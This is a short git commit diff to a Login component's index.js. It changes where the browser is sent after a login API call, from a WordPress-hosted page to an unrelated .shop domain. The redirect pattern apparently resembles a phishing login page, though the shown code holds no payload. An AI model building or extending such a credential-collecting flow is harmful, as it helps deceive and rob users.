23847d6dc6f9dfd0ad9ae22c105810a0975e9b09
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-15 01:06:22 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://wordpress-1479385-5611913.cloudwaysapps.com/bop/nero.html';
+      window.location.href = 'https://vertiza-ions.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
